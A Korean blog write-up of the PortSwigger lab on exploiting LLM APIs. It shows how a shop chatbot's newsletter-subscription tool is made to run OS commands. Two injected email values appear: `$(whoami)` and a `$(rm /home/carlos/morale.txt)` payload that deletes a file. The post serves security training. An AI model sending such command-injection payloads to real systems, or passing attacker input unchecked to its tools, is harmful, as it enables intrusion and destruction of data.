---
layout: post
title: "Burp Academy-LLM 관련 취약점: Exploiting vulnerabilities in LLM APIs"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, LLM]
toc: true
last_modified_at: 2024-04-11 21:00:00 +0900
---

# 개요
- LLM(Large Language Model) 취약점 문제이다. 
- 문제 주소: https://portswigger.net/web-security/llm-attacks/lab-exploiting-vulnerabilities-in-llm-apis
- 취약점 설명페이지: https://portswigger.net/web-security/llm-attacks
- 난이도: PRACTITIONER (보통)

# 취약점 개요 (Chaining vulnerabilities in LLM APIs)
- 일견 해로워보이지 않는 API도, 다른 취약점을 찾는데 이용할 수 있는 경우도 있다. 
- 예를 들면, 파일명을 인풋으로 사용해서 LLM이 패스 트래버셜을 실행하도록 할 수도 있다. 
- 공격 표면을 찾았으면, 클래식 Web 취약점과 결합해서 exploit을 수행할 수 있다. 


# 문제 개요
- 이 랩에는 LLM을 통해 API를 통해서 실행가능한 OS 커맨드 인젝션 취약점이 있다. 
- Carlos의 홈 디렉토리에 있는 morale.txt 파일을 삭제하면 랩이 풀린다. 

```
This lab contains an OS command injection vulnerability that can be exploited via its APIs. You can call these APIs via the LLM. To solve the lab, delete the morale.txt file from Carlos' home directory.
```


# 풀이 
1. 문제 서버를 살펴보면 Livechat 기능이 있다. 여기에 LLM이 사용되고 있을 가능성이 높다. 어떤 API를 실행할 수 있는지 물어보면 다음의 세 가지 API를 사용할 수 있다고 알려준다. 패스워드 재설정, 뉴스레터 구독, 상품 정보 API다. 얼핏 봐서는 딱히 OS 커맨드 인젝션을 사용가능할만한 API가 안 보인다. 

```
As a customer support assistant for the Gin and Juice shop, I can call the following API functions:

1. `password_reset`: This function allows me to request a password reset for a user by providing their username or email.

2. `subscribe_to_newsletter`: This function allows me to subscribe a user to the newsletter by providing their email address.

3. `product_info`: This function allows me to retrieve information about a specific product by providing its name or ID.
```

2. 그나마 product_info가 가능성이 있어보인다? 몇 번 인젝션을 시도해보았으나 안된다. 잘 모르겠으니 답을 본다. 

3. 메일보내는 API가 답이 었다. 메일보내는 기능에서 OS 커맨드를 사용하는 경우가 있으므로, 여기에서 OS 커맨드 인젝션을 사용할 가능성이 있다고 한다. 메일보내는 기능은 뉴스레터 구독기능이다. 

4. 구독기능을 테스트해본다. LLM에게 공격자의 이메일 'attacker@exploit-0a9f00db049eae6a848676b901c3003d.exploit-server.net'로 구독하겠다고 말해본다. LLM이 구독처리에 성공했다고 답해준다. 이메일을 확인해보면 메일이 도착한 것을 알 수 있다. 

![](/images/burp-academy-llm-2-1.png)

5. 다음은 메일의 유저부분에 `$(whoami)`를 넣어서 구독요청을 해본다. 그러면 도착한 메일에서 커맨드 `$(whoami)`가 실행된 값 carlos를 확인할 수 있다! 이 것으로 OS 커맨드 인젝션이 가능한 것을 알았다. 

![](/images/burp-academy-llm-2-2.png)

6. OS 커맨드 인젝션이 가능한 것을 알았으므로 `morale.txt`를 삭제하는 OS 커맨드를 사용해본다. `$(rm /home/carlos/morale.txt)@exploit-0a9f00db049eae6a848676b901c3003d.exploit-server.net`다. 시도해보면 LLM은 이메일 주소가 맞지 않다고 응답해하지만 실제로는 파일 삭제에 성공하여 문제가 풀렸다는 메세지가 출력된다. 

![](/images/burp-academy-llm-2-3.png)

![](/images/burp-academy-llm-2-success.png)